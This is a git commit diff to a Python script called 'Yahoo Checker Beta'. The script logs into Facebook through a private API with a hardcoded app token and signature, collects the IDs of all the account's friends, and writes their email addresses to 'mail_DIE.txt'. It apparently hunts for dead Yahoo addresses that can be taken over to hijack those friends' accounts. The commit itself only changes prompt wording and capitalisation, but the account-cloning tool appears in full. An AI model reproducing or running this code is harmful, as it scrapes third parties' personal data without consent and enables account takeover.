9f5c7748f8bcd1502df44308a3c51ee35fbb63c5
Muhamad Ramdani <53518615+QueenSyifa@users.noreply.github.com>
2019-09-24 13:43:13 +0700

    Update yahoo.py

--- yahoo.py
+++ yahoo.py
@@ -30,27 +30,27 @@ url="https://graph.facebook.com/{}"
 target=[]
 
 def cloning():
-	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("%s[•] %semail: "%(H,P)),getpass("%s[•] %spasss: "%(H,P)))).json()
+	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("%s[•] %sUsername FB: "%(H,P)),getpass("%s[•] %sPassword FB: "%(H,P)))).json()
 	try:
 		a=data["access_token"]
 	except KeyError:
 		exit("%s[!]%s failed when generate access token !!"%(M,P))
-	print "Tool : Yahoo Checker Beta\n"	
+	print "\nTool : Yahoo Checker Beta"	
 	print "----------------------------------------"
-	print "%s[*] %sfetching all user id "%(H,P)
+	print "%s[*] %sFetching all user id "%(H,P)
 	sleep(1)
 	try:
 		for x in s.get(url.format("me/friends?access_token=%s"%(a))).json()["data"]:
 			target.append(x["id"])
-			print "\r%s[*] %s%s retrieved  "%(H,P,x["id"]),
+			print "\r%s[*] %s%s Retrieved  "%(H,P,x["id"]),
 			sys.stdout.flush()
 			sleep(0.003)
 	except KeyError:
-		print "\n%s[!] %sfailed to retrive all user id"%(M,P)
-		exit("%s[!] %sstopped"%(M,P))
-	print "\n%s[*] %sall user id successfuly retrieved"%(H,P)
-	print "%s[*] %sgetting email friends"%(H,P)
-	print "%s[*] %sstart"%(H,P)
+		print "\n%s[!] %sFailed to retrive all user id"%(M,P)
+		exit("%s[!] %sStopped"%(M,P))
+	print "\n%s[*] %sAll user id successfuly retrieved"%(H,P)
+	print "%s[*] %sGetting email friends"%(H,P)
+	print "%s[*] %sStart"%(H,P)
 	print "----------------------------------------"
 	o=open("mail_DIE.txt","w")
 	for meki in target:
@@ -82,16 +82,16 @@ def cloning():
 			print "%s[!]%s no connection"%(M,P)
 			exit("%s[!]%s stopped"%(M,P))
 	o.close()
-	print "\n%s[+]%s done.."%(H,P)
-	exit("%s[#] %sfile saved in: %smail_DIE.txt"%(H,P,H))
+	print "\n%s[+]%s Done.."%(H,P)
+	exit("%s[#] %sFile saved in: %smail_DIE.txt"%(H,P,H))
 
 if __name__=="__main__":
 	os.system("clear")
-	print """%s
-%s----------------------------------------%s
-%s  Coded  : Queen Syifa                  %s%s
-%s  Github : https://github.com/QueenSyifa%s
-%s----------------------------------------
+	print """
+----------------------------------------
+  Coded  : Queen Syifa                  
+  Github : https://github.com/QueenSyifa
+----------------------------------------
  """%(H,P,M,B,R,M,B,R,P)
  
  	cloning()
